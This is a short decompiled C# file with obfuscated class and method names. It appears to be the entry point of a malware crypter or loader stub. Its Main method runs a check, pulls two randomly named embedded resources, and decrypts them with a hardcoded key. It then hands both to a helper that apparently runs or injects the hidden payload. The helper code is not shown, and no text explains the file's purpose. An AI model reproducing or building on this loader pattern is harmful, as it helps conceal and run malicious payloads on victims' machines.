using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class0
{
	[STAThread]
	public static void Main()
	{
		if (Class1.smethod_6())
		{
			ResourceManager resourceManager = new ResourceManager("NdsOCLidHJpKP", Assembly.GetExecutingAssembly());
			byte[] byte_ = Class1.smethod_5((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager.GetObject("bOoLKmTkXbBb")) }, (string[])null, (Type[])null, (bool[])null), "GZsMHvbkljoZTaERQgk");
			byte[] byte_2 = Class1.smethod_5((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager.GetObject("mgyvSoNFB")) }, (string[])null, (Type[])null, (bool[])null), "GZsMHvbkljoZTaERQgk");
			Class1.smethod_4(byte_2, byte_);
		}
	}
}
